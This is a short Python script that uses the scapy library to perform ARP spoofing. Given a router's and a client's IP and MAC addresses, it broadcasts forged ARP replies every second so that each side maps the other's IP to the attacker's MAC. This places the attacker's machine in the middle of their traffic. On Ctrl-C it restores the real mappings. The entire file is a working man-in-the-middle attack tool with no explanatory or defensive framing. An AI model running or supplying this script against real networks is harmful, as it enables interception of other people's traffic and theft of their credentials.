import scapy.all as scapy
import sys
import uuid
import time



def createARPpackage(ip, mac, ipTo, op=2):
	return scapy.ARP(
			op=op,
			pdst=ipTo,
			hwdst=mac,
			psrc=ip
		) # send to [ipTo]: [ip] has [mac] mac addr.

def sendPackage(package, to):
	return scapy.srp(
			scapy.Ether(
				dst=to
			) / package,
			timeout=1,
			verbose=False
		)



def getMyMac():
    mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
    return ':'.join([mac[e:e+2] for e in range(0, 12, 2)])

def getArg(args, arg): return args[args.index(arg) + 1]

def main():
	try:
		routerIp = getArg(sys.argv, '-rip')
		routerMac = getArg(sys.argv, '-rm')
		clientIP = getArg(sys.argv, '-cip')
		clientMac = getArg(sys.argv, '-cm')
	except Exception as error: 
		print(f"Uncorrect arguments! {error}\nRequired: \n")
		print('-rip  -  Router`s ip')
		print('-rm   -  Router`s mac')
		print('-cip  -  Client`s ip')
		print('-cm   -  Client`s mac')
		exit()

	myMac = getMyMac()

	sendedPackCount = 0

	while True:
		try:
			sendPackage(createARPpackage(clientIP, myMac, routerIp), 'ff:ff:ff:ff:ff:ff')
			sendPackage(createARPpackage(routerIp, myMac, clientIP), 'ff:ff:ff:ff:ff:ff')

			sendedPackCount += 2
			print(f'[{sendedPackCount}] sended package'),

			time.sleep(1)
		except KeyboardInterrupt:
			sendPackage(createARPpackage(clientIP, clientMac, routerIp), 'ff:ff:ff:ff:ff:ff')
			sendPackage(createARPpackage(routerIp, routerMac, clientIP), 'ff:ff:ff:ff:ff:ff')
			print('Arp table has been restored.')

			exit()
	

if __name__ == '__main__': main()